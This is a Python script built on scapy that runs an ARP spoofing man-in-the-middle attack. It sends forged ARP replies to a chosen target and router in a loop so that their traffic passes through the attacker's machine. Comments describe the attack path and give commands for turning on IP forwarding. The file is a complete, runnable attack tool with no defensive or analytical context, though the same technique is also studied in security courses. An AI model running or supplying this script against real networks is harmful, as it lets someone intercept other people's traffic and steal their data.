import scapy.all as scapy
import argparse
import subprocess
import time
import sys
# We will be getting data from user as we are router
# Simple behaviour: target -> router
# Our attack: target -> hacker -> router
# psrc - our router ip
# pdst - target ip
# hwdst - target mac address
# op - type of packet: 1 - request, 2 - respondes

# ------------ IMPORTANT ------------
# To enable ip forwarding on Mac: sysctl -w net.inet.ip.forwarding=1
# To enable ip forwarding on Linux:echo 1 > proc/sys/net/ipv4/ip_forward

def get_options():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target ip for for attack")
    parser.add_argument("-r", "--router", dest="router_ip", help="Router or ethernet ip")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip) # get an ip of our computer
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # get a mac address of our computer
    arp_request_brodcast = broadcast/arp_request # arp_request + broadcast
    answered_list = scapy.srp(arp_request_brodcast, timeout=1, verbose=False)[0]
    try:
        mac_address = answered_list[0][1].hwsrc
        return mac_address
    except:
        pass
    

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # we are sending response to target computer that we are router and we are changing route mac to our mac address
    # here we just not write a hwsrc, by default it will be our hacker mac address
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destionation_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destionation_ip, hwdst=get_mac(destionation_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, verbose=False)


options = get_options()
packets_count = 0
if options.target_ip and options.router_ip:
    print("Press CTRL + C to stop the programm")
    try:
        while True:
            print("\r[+] Packets were sent: " + str(packets_count)),
            sys.stdout.flush()
            # target computer send us a data
            spoof(options.target_ip, options.router_ip)
            #  we send data to router
            spoof(options.router_ip, options.target_ip)
            packets_count += 2
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nQuiting...")
        # restore default network after attack
        restore(options.target_ip, options.router_ip)
        restore( options.router_ip, options.target_ip)
else:
    print("[-] Not correct user input. Start script again with --help to watch instructions.")

 